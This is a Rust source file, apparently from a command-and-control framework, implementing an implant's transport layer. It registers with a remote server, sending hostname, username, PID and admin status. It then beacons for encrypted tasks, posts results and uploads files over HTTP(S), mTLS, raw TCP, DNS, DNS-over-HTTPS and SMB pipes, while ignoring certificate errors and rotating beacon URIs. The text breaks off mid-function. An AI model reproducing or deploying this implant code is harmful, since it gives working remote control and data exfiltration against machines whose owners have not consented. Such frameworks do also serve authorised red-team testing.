/// HTTP/HTTPS/TCP/mTLS transport for the Rust agent.
/// HTTP/HTTPS/mTLS: WinHTTP (Windows) or raw TCP (Linux).
/// TCP: std::net with 4-byte LE-length-prefixed framed JSON.
///
/// Registration: POST /register or TCP "register" msg → {agent_id, aes_key}
/// Beacon:       GET  /beacon/<id> or TCP "beacon" → AES-GCM tasks; 204/no_tasks = none
/// Result:       POST /result/<id> or TCP "result" → AES-GCM {task_id,output,error,is_admin}
/// Upload:       POST /upload/<id>/<name> or TCP "upload" → AES-GCM {task_id,filename,data}
/// Download:     GET  /dl/<id>/<name> → AES-GCM raw bytes (TCP: not supported)
use core::ffi::c_void;
use core::ptr;
use std::io::{Read, Write};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde_json::Value;

#[cfg(target_os = "windows")]
use windows_sys::Win32::Networking::WinHttp::{
    WinHttpAddRequestHeaders, WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest,
    WinHttpQueryHeaders, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WinHttpSetOption,
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_ADDREQ_FLAG_ADD, WINHTTP_FLAG_SECURE,
    WINHTTP_OPTION_SECURITY_FLAGS, WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_QUERY_STATUS_CODE,
};

use crate::{config, crypto};
use crate::transport_dns;
use crate::transport_doh;
#[cfg(target_os = "windows")]
use crate::transport_smb;

// Self-signed cert ignore flags (standard WinHTTP constants)
#[cfg(target_os = "windows")]
const SEC_IGNORE_UNKNOWN_CA: u32        = 0x0100;
#[cfg(target_os = "windows")]
const SEC_IGNORE_CERT_WRONG_USAGE: u32  = 0x0200;
#[cfg(target_os = "windows")]
const SEC_IGNORE_CERT_CN_INVALID: u32   = 0x1000;
#[cfg(target_os = "windows")]
const SEC_IGNORE_CERT_DATE_INVALID: u32 = 0x2000;

// mTLS: set the client certificate on a WinHTTP request
#[cfg(target_os = "windows")]
const WINHTTP_OPTION_CLIENT_CERT_CONTEXT: u32 = 47;

// WinHTTP TLS protocol options (session-level)
#[cfg(target_os = "windows")]
const WINHTTP_OPTION_SECURE_PROTOCOLS: u32           = 84;
#[cfg(target_os = "windows")]
const WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2: u32       = 0x00000800;
#[cfg(target_os = "windows")]
const WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3: u32       = 0x00002000;

// crypt32 encoding / search constants
#[cfg(target_os = "windows")]
const X509_ASN_ENCODING: u32   = 0x00000001;
#[cfg(target_os = "windows")]
const PKCS_7_ASN_ENCODING: u32 = 0x00010000;
#[cfg(target_os = "windows")]
const CERT_FIND_ANY: u32       = 0;
#[cfg(target_os = "windows")]
const CRYPT_EXPORTABLE: u32    = 0x00000001;

// ── crypt32 imports ───────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
#[repr(C)]
struct CryptDataBlob {
    cb_data: u32,
    pb_data: *const u8,
}

#[cfg(target_os = "windows")]
#[link(name = "crypt32")]
extern "system" {
    fn PFXImportCertStore(
        p_pfx:       *const CryptDataBlob,
        sz_password: *const u16,
        dw_flags:    u32,
    ) -> *mut c_void;

    fn CertFindCertificateInStore(
        h_cert_store:        *mut c_void,
        dw_cert_encoding:    u32,
        dw_find_flags:       u32,
        dw_find_type:        u32,
        pv_find_para:        *const c_void,
        p_prev_cert_context: *const c_void,
    ) -> *mut c_void;
}

// ── RAII WinHTTP handle wrapper ───────────────────────────────────────────────

#[cfg(target_os = "windows")]
struct WHandle(*mut c_void);
#[cfg(target_os = "windows")]
impl Drop for WHandle {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { WinHttpCloseHandle(self.0); }
        }
    }
}
#[cfg(target_os = "windows")]
impl WHandle {
    fn is_null(&self) -> bool { self.0.is_null() }
    fn raw(&self) -> *mut c_void { self.0 }
}

// ── Wide string helper ────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub(crate) fn wstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0u16)).collect()
}

// ── URL parser ────────────────────────────────────────────────────────────────

struct ParsedUrl {
    is_https: bool,
    host: String,
    port: u16,
    base: String, // path prefix (may be empty)
}

fn parse_url(url: &str) -> ParsedUrl {
    let (is_https, rest) = if url.starts_with("https://") {
        (true, &url[8..])
    } else if url.starts_with("http://") {
        (false, &url[7..])
    } else {
        (false, url)
    };
    let default_port: u16 = if is_https { 443 } else { 80 };

    let (host_port, base) = if let Some(i) = rest.find('/') {
        (&rest[..i], rest[i..].to_string())
    } else {
        (rest, String::new())
    };

    let (host, port) = if let Some(i) = host_port.rfind(':') {
        let p = host_port[i + 1..].parse().unwrap_or(default_port);
        (host_port[..i].to_string(), p)
    } else {
        (host_port.to_string(), default_port)
    };

    ParsedUrl { is_https, host, port, base }
}

// ── TCP framing helpers ───────────────────────────────────────────────────────

/// Write a 4-byte LE length prefix followed by `data` to the stream.
fn tcp_write_frame(stream: &mut std::net::TcpStream, data: &[u8]) -> bool {
    let len = data.len() as u32;
    stream.write_all(&len.to_le_bytes()).is_ok() && stream.write_all(data).is_ok()
}

/// Read a 4-byte LE length prefix then that many bytes from the stream.
fn tcp_read_frame(stream: &mut std::net::TcpStream) -> Option<Vec<u8>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).ok()?;
    let len = u32::from_le_bytes(len_buf) as usize;
    let mut data = vec![0u8; len];
    stream.read_exact(&mut data).ok()?;
    Some(data)
}

// ── mTLS certificate loader (Windows only) ────────────────────────────────────

/// Decode `config::AGENT_PFX` (base64 PKCS12) and return a CERT_CONTEXT pointer
/// suitable for `WINHTTP_OPTION_CLIENT_CERT_CONTEXT`.  Returns null on any failure.
#[cfg(target_os = "windows")]
fn load_mtls_cert() -> *mut c_void {
    let pfx_b64 = config::AGENT_PFX;
    if pfx_b64.is_empty() {
        return ptr::null_mut();
    }
    let pfx_bytes = match STANDARD.decode(pfx_b64) {
        Ok(b) => b,
        Err(_) => return ptr::null_mut(),
    };
    let blob = CryptDataBlob {
        cb_data: pfx_bytes.len() as u32,
        pb_data: pfx_bytes.as_ptr(),
    };
    // Empty (null-terminated) password for the PKCS12 bag
    let password: Vec<u16> = core::iter::once(0u16).collect();
    unsafe {
        let h_store = PFXImportCertStore(&blob, password.as_ptr(), CRYPT_EXPORTABLE);
        if h_store.is_null() {
            return ptr::null_mut();
        }
        // Return the first cert in the store.  The store is intentionally left open
        // so that the returned CERT_CONTEXT remains valid for the process lifetime.
        CertFindCertificateInStore(
            h_store,
            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            0,
            CERT_FIND_ANY,
            ptr::null(),
            ptr::null(),
        )
    }
}

// ── Core HTTP implementation (Windows: WinHTTP) ───────────────────────────────

/// Internal HTTP worker.  Pass `cert_ctx = null_mut()` for plain HTTP/HTTPS;
/// pass a valid CERT_CONTEXT pointer for mTLS.
#[cfg(target_os = "windows")]
pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
    let p = parse_url(config::SERVER_URL);
    let full_path = format!("{}{}", p.base, path);

    let ua_w   = wstr(config::USER_AGENT);
    let host_w = wstr(&p.host);
    let meth_w = wstr(method);
    let path_w = wstr(&full_path);

    let secure = if p.is_https { WINHTTP_FLAG_SECURE } else { 0 };

    unsafe {
        let h_sess = WHandle(WinHttpOpen(
            ua_w.as_ptr(),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            ptr::null(),
            ptr::null(),
            0,
        ));
        if h_sess.is_null() {
            return None;
        }

        // Enable TLS 1.2 + TLS 1.3 explicitly so Go 1.23+ servers with PQ curves
        // can negotiate TLS 1.3 (WinHTTP may default to TLS 1.2-only on some builds).
        if p.is_https {
            let proto_flags: u32 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
                | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
            WinHttpSetOption(
                h_sess.raw(),
                WINHTTP_OPTION_SECURE_PROTOCOLS,
                &proto_flags as *const u32 as *const c_void,
                core::mem::size_of::<u32>() as u32,
            );
        }

        let h_conn = WHandle(WinHttpConnect(h_sess.raw(), host_w.as_ptr(), p.port, 0));
        if h_conn.is_null() {
            return None;
        }

        let h_req = WHandle(WinHttpOpenRequest(
            h_conn.raw(),
            meth_w.as_ptr(),
            path_w.as_ptr(),
            ptr::null(),
            ptr::null(),
            ptr::null(),
            secure,
        ));
        if h_req.is_null() {
            return None;
        }

        if p.is_https {
            // Ignore self-signed cert errors (same as Go/Nim agents)
            let flags: u32 = SEC_IGNORE_UNKNOWN_CA
                | SEC_IGNORE_CERT_WRONG_USAGE
                | SEC_IGNORE_CERT_CN_INVALID
                | SEC_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(
                h_req.raw(),
                WINHTTP_OPTION_SECURITY_FLAGS,
                &flags as *const u32 as *const c_void,
                core::mem::size_of::<u32>() as u32,
            );

            // mTLS: attach our client certificate to the request
            if !cert_ctx.is_null() {
                WinHttpSetOption(
                    h_req.raw(),
                    WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                    cert_ctx as *const c_void,
                    40u32, // sizeof(CERT_CONTEXT) on x64 per WinHTTP docs
                );
            }
        }

        let body_ptr: *const c_void = if body.is_empty() {
            ptr::null()
        } else {
            body.as_ptr() as *const c_void
        };

        if WinHttpSendRequest(
            h_req.raw(),
            ptr::null(),
            0,
            body_ptr,
            body.len() as u32,
            body.len() as u32,
            0,
        ) == 0 {
            return None;
        }

        if WinHttpReceiveResponse(h_req.raw(), ptr::null_mut()) == 0 {
            return None;
        }

        let mut status: u32 = 0;
        let mut sz: u32 = 4;
        WinHttpQueryHeaders(
            h_req.raw(),
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            ptr::null(),
            &mut status as *mut u32 as *mut c_void,
            &mut sz,
            ptr::null_mut(),
        );

        let mut resp = Vec::new();
        let mut buf = [0u8; 8192];
        let mut got: u32 = 0;
        loop {
            if WinHttpReadData(
                h_req.raw(),
                buf.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut got,
            ) == 0 || got == 0 { break; }
            resp.extend_from_slice(&buf[..got as usize]);
        }

        Some((status, resp))
    }
}

/// Public HTTP helper (no client certificate).  Used for plain http/https transport.
#[cfg(target_os = "windows")]
pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    http_do_inner(method, path, body, ptr::null_mut())
}

/// Like http_do but injects an extra request header (e.g., "X-C2-Parent: <id>\r\n").
#[cfg(target_os = "windows")]
pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
    if extra_header.is_empty() { return http_do(method, path, body); }
    let p = parse_url(config::SERVER_URL);
    let full_path = format!("{}{}", p.base, path);
    let ua_w   = wstr(config::USER_AGENT);
    let host_w = wstr(&p.host);
    let meth_w = wstr(method);
    let path_w = wstr(&full_path);
    let secure = if p.is_https { WINHTTP_FLAG_SECURE } else { 0 };
    unsafe {
        let h_sess = WHandle(WinHttpOpen(ua_w.as_ptr(), WINHTTP_ACCESS_TYPE_NO_PROXY, ptr::null(), ptr::null(), 0));
        if h_sess.is_null() { return None; }
        let h_conn = WHandle(WinHttpConnect(h_sess.raw(), host_w.as_ptr(), p.port, 0));
        if h_conn.is_null() { return None; }
        let h_req = WHandle(WinHttpOpenRequest(h_conn.raw(), meth_w.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), secure));
        if h_req.is_null() { return None; }
        if p.is_https {
            let flags: u32 = SEC_IGNORE_UNKNOWN_CA | SEC_IGNORE_CERT_WRONG_USAGE | SEC_IGNORE_CERT_CN_INVALID | SEC_IGNORE_CERT_DATE_INVALID;
            WinHttpSetOption(h_req.raw(), WINHTTP_OPTION_SECURITY_FLAGS, &flags as *const u32 as *const c_void, core::mem::size_of::<u32>() as u32);
        }
        let hdr_w = wstr(extra_header);
        WinHttpAddRequestHeaders(h_req.raw(), hdr_w.as_ptr(), extra_header.len() as u32, WINHTTP_ADDREQ_FLAG_ADD);
        let body_ptr: *const c_void = if body.is_empty() { ptr::null() } else { body.as_ptr() as *const c_void };
        if WinHttpSendRequest(h_req.raw(), ptr::null(), 0, body_ptr, body.len() as u32, body.len() as u32, 0) == 0 { return None; }
        if WinHttpReceiveResponse(h_req.raw(), ptr::null_mut()) == 0 { return None; }
        let mut status: u32 = 0; let mut sz: u32 = 4;
        WinHttpQueryHeaders(h_req.raw(), WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, ptr::null(), &mut status as *mut u32 as *mut c_void, &mut sz, ptr::null_mut());
        let mut data = Vec::new();
        let mut buf = [0u8; 8192]; let mut got: u32 = 0;
        loop {
            if WinHttpReadData(h_req.raw(), buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut got) == 0 || got == 0 { break; }
            data.extend_from_slice(&buf[..got as usize]);
        }
        Some((status, data))
    }
}

// ── Core HTTP implementation (Linux: raw TCP) ─────────────────────────────────

#[cfg(not(target_os = "windows"))]
pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], _cert_ctx: *mut c_void) -> Option<(u32, Vec<u8>)> {
    http_do_linux_inner(method, path, body, "")
}

#[cfg(not(target_os = "windows"))]
pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
    http_do_linux_inner(method, path, body, "")
}

#[cfg(not(target_os = "windows"))]
pub fn http_do_with_header(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
    http_do_linux_inner(method, path, body, extra_header)
}

/// Minimal HTTP/1.1 client over plain TCP (no TLS).
/// Supports HTTP; returns None for HTTPS (no TLS stack without an extra crate).
#[cfg(not(target_os = "windows"))]
fn http_do_linux_inner(method: &str, path: &str, body: &[u8], extra_header: &str) -> Option<(u32, Vec<u8>)> {
    use std::net::TcpStream;

    let p = parse_url(config::SERVER_URL);
    let full_path = format!("{}{}", p.base, path);

    let addr = format!("{}:{}", p.host, p.port);
    let mut stream = TcpStream::connect(&addr).ok()?;

    // Build HTTP/1.1 request
    let mut req = format!(
        "{} {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nContent-Length: {}\r\nConnection: close\r\n",
        method, full_path, p.host, config::USER_AGENT, body.len()
    );
    if !body.is_empty() {
        req.push_str("Content-Type: application/octet-stream\r\n");
    }
    if !extra_header.is_empty() {
        req.push_str(extra_header);
    }
    req.push_str("\r\n");

    stream.write_all(req.as_bytes()).ok()?;
    if !body.is_empty() {
        stream.write_all(body).ok()?;
    }

    let mut resp_bytes = Vec::new();
    stream.read_to_end(&mut resp_bytes).ok()?;

    // Find end of headers
    let header_end = resp_bytes.windows(4).position(|w| w == b"\r\n\r\n")?;
    let header_str = std::str::from_utf8(&resp_bytes[..header_end]).ok()?;

    // Parse status code from first line: "HTTP/1.1 200 OK"
    let status_line = header_str.lines().next()?;
    let status: u32 = status_line.split_whitespace().nth(1)?.parse().ok()?;

    let resp_body = resp_bytes[header_end + 4..].to_vec();
    Some((status, resp_body))
}

// ── Agent transport ───────────────────────────────────────────────────────────

pub struct AgentTransport {
    pub agent_id: String,
    pub aes_key:  Vec<u8>,
    uri_idx:      usize,
    uri_list:     Vec<String>,
    /// "host:port" for TCP transport; empty for HTTP/HTTPS/mTLS.
    tcp_addr:     String,
    /// Persistent TCP connection (TCP transport only).
    tcp_conn:     Option<std::net::TcpStream>,
    /// CERT_CONTEXT pointer for mTLS; null_mut() otherwise.
    /// Raw pointer: AgentTransport is only ever used on the main thread.
    cert_ctx:     *mut c_void,
    /// Named pipe HANDLE for SMB transport; INVALID_HANDLE_VALUE otherwise.
    smb_pipe:     isize,
    /// DNS resolver "host:port" for DNS/DoH transports.
    dns_server:   String,
    /// Authoritative C2 domain for DNS transport.
    dns_domain:   String,
}

impl Default for AgentTransport {
    fn default() -> Self {
        AgentTransport {
            agent_id:   String::new(),
            aes_key:    Vec::new(),
            uri_idx:    0,
            uri_list:   Vec::new(),
            tcp_addr:   String::new(),
            tcp_conn:   None,
            cert_ctx:   ptr::null_mut(),
            smb_pipe:   -1isize, // INVALID_HANDLE_VALUE
            dns_server: String::new(),
            dns_domain: String::new(),
        }
    }
}

pub struct TaskWire {
    pub id:      i64,
    pub typ:     String,
    pub args:    String,
    pub payload: Vec<u8>,
}

impl AgentTransport {
    pub fn new() -> Self {
        let mut t = AgentTransport::default();
        if !config::BEACON_URIS.is_empty() {
            t.uri_list = config::BEACON_URIS.split(',').map(|s| s.to_string()).collect();
        }
        match config::TRANSPORT {
            "tcp" => {
                let addr = config::SERVER_URL
                    .strip_prefix("tcp://")
                    .unwrap_or(config::SERVER_URL);
                t.tcp_addr = addr.to_string();
            }
            #[cfg(target_os = "windows")]
            "mtls" => {
                t.cert_ctx = load_mtls_cert();
            }
            "dns" => {
                let srv = config::DNS_SERVER;
                t.dns_server = if srv.contains(':') {
                    srv.to_string()
                } else {
                    format!("{}:53", srv)
                };
                t.dns_domain = config::DNS_DOMAIN.to_ascii_lowercase()
                    .trim_matches('.').to_string();
            }
            "doh" => {
                // DoH uses HTTP for registration; no extra state needed
            }
            #[cfg(target_os = "windows")]
            "smb" => {
                // SMB pipe opened during registration
            }
            _ => {}
        }
        t
    }

    fn exe_name() -> String {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
            .unwrap_or_else(|| "agent".to_string())
    }

    pub fn register(&mut self) -> bool {
        self.try_register().is_some()
    }

    #[cfg(target_os = "windows")]
    fn is_elevated() -> bool {
        use windows_sys::Win32::Foundation::CloseHandle;
        use windows_sys::Win32::Security::{
            GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
        };
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
        unsafe {
            let mut token = 0isize;
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }
            let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut sz: u32 = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
            let ok = GetTokenInformation(
                token, TokenElevation,
                &mut elev as *mut _ as *mut core::ffi::c_void,
                sz, &mut sz,
            );
            CloseHandle(token);
            ok != 0 && elev.TokenIsElevated != 0
        }
    }

    #[cfg(not(target_os = "windows"))]
    fn is_elevated() -> bool {
        // Check if running as root (uid 0)
        unsafe { libc_getuid() == 0 }
    }

    // ── TCP helpers ───────────────────────────────────────────────────────────

    /// Connect tcp_conn if not already connected.  Returns false on failure.
    fn tcp_ensure_connected(&mut self) -> bool {
        if self.tcp_conn.is_some() { return true; }
        match std::net::TcpStream::connect(self.tcp_addr.as_str()) {
            Ok(conn) => { self.tcp_conn = Some(conn); true }
            Err(_) => false,
        }
    }

    /// Serialize `{"t": typ, "p": payload}` and write a framed message.
    fn tcp_send_msg(&mut self, typ: &str, payload: &Value) -> bool {
        let msg  = serde_json::json!({"t": typ, "p": payload});
        let data = msg.to_string().into_bytes();
        if let Some(ref mut conn) = self.tcp_conn {
            tcp_write_frame(conn, &data)
        } else {
            false
        }
    }

    /// Read one framed message and deserialize `{"t":..., "p":...}`.
    fn tcp_recv_msg(&mut self) -> Option<(String, Value)> {
        let data = if let Some(ref mut conn) = self.tcp_conn {
            tcp_read_frame(conn)?
        } else {
            return None;
        };
        let j: Value = serde_json::from_slice(&data).ok()?;
        let t = j["t"].as_str()?.to_string();
        let p = j["p"].clone();
        Some((t, p))
    }

    // ── Registration ──────────────────────────────────────────────────────────

    fn try_register(&mut self) -> Option<()> {
        match config::TRANSPORT {
            "dns" => {
                let id = transport_dns::register(&self.dns_server, &self.dns_domain)?;
                self.agent_id = id;
                // DNS doesn't use AES; leave aes_key empty
                return Some(());
            }
            #[cfg(target_os = "windows")]
            "smb" => {
                let h = transport_smb::open_pipe(config::SMB_PIPE);
                if h == -1isize { return None; }
                let (id, key) = transport_smb::register(h)?;
                self.agent_id = id;
                self.aes_key  = key;
                self.smb_pipe = h;
                return Some(());
            }
            _ => {}
        }

        let hostname = get_hostname();
        let username = get_username();
        let os_str = if cfg!(target_os = "windows") {
            if cfg!(target_arch = "x86_64") { "windows/amd64" } else { "windows/x86" }
        } else if cfg!(target_os = "linux") {
            if cfg!(target_arch = "x86_64") { "linux/amd64" } else { "linux/x86" }
        } else {
            "unknown"
        };

        let body = serde_json::json!({
            "hostname":     hostname,
            "username":     username,
            "os":           os_str,
            "pid":          std::process::id(),
            "transport":    config::TRANSPORT,
            "sleep_sec":    config::SLEEP_SEC,
            "jitter_pct":   config::JITTER_PCT,
            "process_name": Self::exe_name(),
            "is_admin":     Self::is_elevated(),
            "language":     "rust",
        });

        if config::TRANSPORT == "tcp" {
            if !self.tcp_ensure_connected() { return None; }
            if !self.tcp_send_msg("register", &body) {
                self.tcp_conn = None;
                return None;
            }
            let (typ, p) = self.tcp_recv_msg()?;
            if typ != "register_resp" { return None; }
            self.agent_id = p["agent_id"].as_str()?.to_string();
            self.aes_key  = STANDARD.decode(p["aes_key"].as_str()?).ok()?;
            return Some(());
        }

        // HTTP / HTTPS / mTLS / DoH (DoH delegates registration to HTTP)
        let (code, resp) = http_do_inner("POST", "/register", body.to_string().as_bytes(), self.cert_ctx)?;
        if code != 200 || resp.is_empty() { return None; }
        let j: Value = serde_json::from_slice(&resp).ok()?;
        self.agent_id = j["agent_id"].as_str()?.to_string();
        self.aes_key  = STANDARD.decode(j["aes_key"].as_str()?).ok()?;
        Some(())
    }

    // ── Beacon ────────────────────────────────────────────────────────────────

    pub fn beacon(&mut self) -> Vec<TaskWire> {
        match config::TRANSPORT {
            "dns" => {
                let plain = match transport_dns::beacon(&self.dns_server, &self.dns_domain, &self.agent_id) {
                    Some(p) => p,
                    None    => return vec![],
                };
                // DNS returns a single-task JSON object, wrap as {"tasks":[...]}
                let j: Value = match serde_json::from_slice(&plain) { Ok(v) => v, Err(_) => return vec![] };
                let id   = j["id"].as_i64().unwrap_or(0);
                let typ  = j["type"].as_str().unwrap_or("").to_string();
                let args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
                return vec![TaskWire { id, typ, args, payload: vec![] }];
            }
            "doh" => {
                // GET /dns-query?name=b.<dohEncode(agentID)>&type=TXT
                let name    = format!("b.{}", transport_doh::doh_encode(self.agent_id.as_bytes()));
                let path    = format!("/dns-query?name={}&type=TXT", transport_doh::url_encode(&name));
                let accept  = "Accept: application/dns-message\r\n";
                let (code, resp) = http_do_with_header("GET", &path, &[], accept).unwrap_or((0, vec![]));
                if code == 204 || resp.is_empty() || code != 200 { return vec![]; }
                let raw_txt = transport_doh::parse_doh_txt(&resp);
                let plain   = match transport_doh::decrypt_beacon(&raw_txt, &self.aes_key) {
                    Some(p) => p,
                    None    => return vec![],
                };
                return parse_tasks(&plain);
            }
            #[cfg(target_os = "windows")]
            "smb" => {
                if self.smb_pipe == -1isize { return vec![]; }
                let resp = match transport_smb::beacon(self.smb_pipe, &self.agent_id) {
                    Some(r) => r,
                    None    => return vec![],
                };
                return transport_smb::parse_smb_tasks(&resp);
            }
            "tcp" => {
                if !self.tcp_ensure_connected() { return vec![]; }
                if !self.tcp_send_msg("beacon", &Value::Null) {
                    self.tcp_conn = None;
                    return vec![];
                }
                let (typ, p) = match self.tcp_recv_msg() {
                    Some(m) => m,
                    None    => { self.tcp_conn = None; return vec![]; }
                };
                if typ == "no_tasks" { return vec![]; }
                if typ != "tasks"    { return vec![]; }
                let b64 = match p.as_str() { Some(s) => s, None => return vec![] };
                let enc = match STANDARD.decode(b64) { Ok(e) => e, Err(_) => return vec![] };
                let plain = match crypto::open(&self.aes_key, &enc) {
                    Some(p) => p,
                    None    => return vec![],
                };
                return parse_tasks(&plain);
            }
            _ => {}
        }

        // HTTP / HTTPS / mTLS
        let path = if self.uri_list.is_empty() {
            format!("/beacon/{}", self.agent_id)
        } else {
            let uri = &self.uri_list[self.uri_idx % self.uri_list.len()];
            self.uri_idx += 1;
            format!("{}/{}", uri, self.agent_id)
        };
        let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
        if code == 204 || resp.is_empty() || code != 200 { return vec![]; }
        let plain = match crypto::open(&self.aes_key, &resp) {
            Some(p) => p,
            None    => return vec![],
        };
        parse_tasks(&plain)
    }

    // ── Result / Upload / Download ────────────────────────────────────────────

    pub fn send_result(&mut self, task_id: i64, output: &str, error: &str) {
        self.send_result_admin(task_id, output, error, false);
    }

    pub fn send_result_admin(&mut self, task_id: i64, output: &str, error: &str, is_admin: bool) {
        match config::TRANSPORT {
            "dns" => {
                transport_dns::send_result(&self.dns_server, &self.dns_domain,
                    &self.agent_id, task_id, output, error);
                return;
            }
            "doh" => {
                let ct = transport_doh::make_result_ciphertext(&self.aes_key, task_id, output, error);
                if transport_doh::is_small_result(&ct) {
                    let name = transport_doh::make_result_query_name(&self.agent_id, &ct);
                    let path = format!("/dns-query?name={}&type=TXT",
                        transport_doh::url_encode(&name));
                    let _ = http_do_with_header("GET", &path, &[], "Accept: application/dns-message\r\n");
                } else {
                    let path = format!("/result/{}", self.agent_id);
                    let _ = http_do_inner("POST", &path, &ct, self.cert_ctx);
                }
                return;
            }
            #[cfg(target_os = "windows")]
            "smb" => {
                if self.smb_pipe != -1isize {
                    transport_smb::send_result(self.smb_pipe, &self.agent_id,
                        task_id, output, error, is_admin);
                }
                return;
            }
            "tcp" => {
                if self.aes_key.is_empty() { return; }
                let plain = serde_json::json!({
                    "task_id":  task_id, "output": output,
                    "error":    error,   "is_admin": is_admin,
                }).to_string();
                let enc     = crypto::seal(&self.aes_key, plain.as_bytes());
                let payload = Value::String(STANDARD.encode(&enc));
                if !self.tcp_send_msg("result", &payload) { self.tcp_conn = None; }
                return;
            }
            _ => {}
        }

        // HTTP / HTTPS / mTLS
        if self.aes_key.is_empty() { return; }
        let plain = serde_json::json!({
            "task_id":  task_id,
            "output":   output,
            "error":    error,
            "is_admin": is_admin,
        }).to_string();
        let enc  = crypto::seal(&self.aes_key, plain.as_bytes());
        let path = format!("/result/{}", self.agent_id);
        let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
    }

    pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) {
        match config::TRANSPORT {
            "dns" => {
                // Not supported — send a note as the result
                self.send_result(task_id,
                    &format!("file:{}:size={}", filename, data.len()),
                    "upload-not-supported-over-dns");
                return;
            }
            #[cfg(target_os = "windows")]
            "smb" => {
                self.send_result(task_id,
                    &format!("file:{}:size={}", filename, data.len()),
                    "upload-not-supported-over-smb");
                return;
            }
            "tcp" => {
                if self.aes_key.is_empty() { return; }
                let inner = serde_json::json!({
                    "task_id":  task_id,
                    "filename": filename,
                    "data":     STANDARD.encode(data),
                }).to_string();
                let enc     = crypto::seal(&self.aes_key, inner.as_bytes());
                let payload = Value::String(STANDARD.encode(&enc));
                if !self.tcp_send_msg("upload", &payload) { self.tcp_conn = None; }
                return;
            }
            _ => {}
        }
        if self.aes_key.is_empty() { return; }
        let enc  = crypto::seal(&self.aes_key, data);
        let path = format!("/upload/{}/{}", self.agent_id, filename);
        let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
    }

    pub fn download_file(&mut self, filename: &str) -> Vec<u8> {
        match config::TRANSPORT {
            "dns" => return vec![],
            #[cfg(target_os = "windows")]
            "smb" => return vec![],
            "tcp" => return vec![],
            _ => {}
        }
        if self.aes_key.is_empty() { return vec![]; }
        let path = format!("/dl/{}/{}", self.agent_id, filename);
        let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
        if code != 200 || resp.is_empty() { return vec![]; }
        crypto::open(&self.aes_key, &resp).unwrap_or_default()
    }
}

// ── Hostname / username helpers ───────────────────────────────────────────────

fn get_hostname() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("COMPUTERNAME").map(|s| s.to_lowercase()).unwrap_or_else(|_| "UNKNOWN".into()) }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("HOSTNAME").unwrap_or_else(|_| {
            std::fs::read_to_string("/proc/sys/kernel/hostname")
                .map(|s| s.trim().to_string())
                .unwrap_or_else(|_| "UNKNOWN".into())
        })
    }
}

fn get_username() -> String {
    #[cfg(target_os = "windows")]
    {
        // Use USERDOMAIN\USERNAME to get DOMAIN\user format (like NameSamCompatible).
        // Fall back to plain USERNAME if USERDOMAIN equals COMPUTERNAME (local user).
        let user   = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
        let domain = std::env::var("USERDOMAIN").unwrap_or_default();
        let host   = std::env::var("COMPUTERNAME").unwrap_or_default();
        if !domain.is_empty() && domain != host {
            format!("{}\\{}", domain, user)
        } else {
            user
        }
    }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("USER").or_else(|_| std::env::var("LOGNAME")).unwrap_or_else(|_| "UNKNOWN".into()) }
}

// ── libc uid helper (Linux only) ─────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
extern "C" {
    fn getuid() -> u32;
}

#[cfg(not(target_os = "windows"))]
fn libc_getuid() -> u32 {
    unsafe { getuid() }
}

// ── Task deserialisation helper ───────────────────────────────────────────────

fn parse_tasks(plain: &[u8]) -> Vec<TaskWire> {
    let j: Value = match serde_json::from_slice(plain) {
        Ok(v)  => v,
        Err(_) => return vec![],
    };
    let arr = match j["tasks"].as_array() {
        Some(a) => a,
        None    => return vec![],
    };
    arr.iter().map(|t| TaskWire {
        id:      t["id"].as_i64().unwrap_or(0),
